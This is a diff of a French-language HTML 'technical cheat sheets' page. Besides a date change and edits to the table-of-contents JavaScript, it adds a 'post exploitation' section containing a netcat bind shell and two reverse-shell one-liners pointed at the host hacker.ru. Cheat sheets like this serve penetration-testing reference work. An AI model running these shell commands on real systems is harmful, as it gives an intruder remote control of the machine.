@@ -5,7 +5,7 @@
   <meta http-equiv="Content-Style-Type" content="text/css" />
   <meta name="generator" content="pandoc" />
   <meta name="author" content="Poulpy, Plopi42" />
-  <meta name="date" content="2012-10-18" />
+  <meta name="date" content="2012-11-06" />
   <title>Technical cheat sheets</title>
   <style type="text/css">
 table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode {
@@ -33,7 +33,7 @@ code > span.er { font-weight: bold; }
 <div id="header">
 <h1 class="title">Technical cheat sheets</h1>
 <h2 class="author">Poulpy, Plopi42</h2>
-<h3 class="date">2012-10-18</h3>
+<h3 class="date">2012-11-06</h3>
 </div>
 <div id="TOC">
 <ul>
@@ -67,6 +67,10 @@ code > span.er { font-weight: bold; }
 <li><a href="#utilisation">Utilisation</a></li>
 <li><a href="#instalation">Instalation</a></li>
 </ul></li>
+</ul></li>
+<li><a href="#commandes-linux-post-exploitation">Commandes Linux post exploitation</a><ul>
+<li><a href="#création-dun-bindshell">Création d’un bindshell</a></li>
+<li><a href="#création-dun-reverse-bindshell">Création d’un reverse bindshell</a></li>
 </ul></li>
 </ul></li>
 <li><a href="#tools">Tools</a><ul>
@@ -448,6 +452,15 @@ QUJDQQ==</code></pre>
 <pre><code>ifdata -pa eth0</code></pre>
 <h4 id="instalation"><a href="#TOC">Instalation</a></h4>
 <pre><code>apt-get install moreutils</code></pre>
+<h2 id="commandes-linux-post-exploitation"><a href="#TOC">Commandes Linux post exploitation</a></h2>
+<h3 id="création-dun-bindshell"><a href="#TOC">Création d’un bindshell</a></h3>
+<pre><code>nc -e /bin/bash -lp 8080</code></pre>
+<p>Si la première version ne fonctionne pas :</p>
+<pre><code>nc -e /bin/bash -l 8080</code></pre>
+<h3 id="création-dun-reverse-bindshell"><a href="#TOC">Création d’un reverse bindshell</a></h3>
+<pre><code>/bin/bash &lt; /dev/tcp/hacker.ru/80 1&gt;&amp;0</code></pre>
+<p>Si netcat est présent :</p>
+<pre><code>nc -e /bin/bash hacker.ru 80</code></pre>
 <h1 id="tools"><a href="#TOC">Tools</a></h1>
 <h2 id="git"><a href="#TOC">GIT</a></h2>
 <h3 id="ressources"><a href="#TOC">Ressources</a></h3>
@@ -710,6 +723,7 @@ function expandListHideAll(rootName)
           for (var k = 0; k < lvl2.childNodes.length; k++)
           {
             var node = lvl2.childNodes[k];
+            node.className = "Folded";
             if (node.tagName == "LI")
             {
               for (var l = 0; l < node.childNodes.length; l++)
@@ -731,6 +745,7 @@ function expandListHideAll(rootName)
 function expandListExpand(e, parent)
 {
   expandListHideAll(parent);
+  e.className = "Expanded";
 
   for (var j = 0; j < e.childNodes.length; j++)
   {
@@ -758,9 +773,19 @@ function expandListAdd(rootName)
           for (var k = 0; k < lvl2.childNodes.length; k++)
           {
             var node = lvl2.childNodes[k];
+            node.className = "Folded";
             if (node.tagName == "LI")
             {
-              node.onmouseover = function(){expandListExpand(this, rootName)};
+              node.onclick = function(){
+                if (this.className == "Expanded")
+                {
+                  return true;
+                }
+
+                expandListExpand(this, rootName);
+                return false;
+              };
+              //node.ondblclick = function(){document.location = node.href};
 
               for (var l = 0; l < node.childNodes.length; l++)
               {
@@ -779,6 +804,7 @@ function expandListAdd(rootName)
 }
 
 expandListAdd("TOC");
+
 </script>
 </body>
 </html>
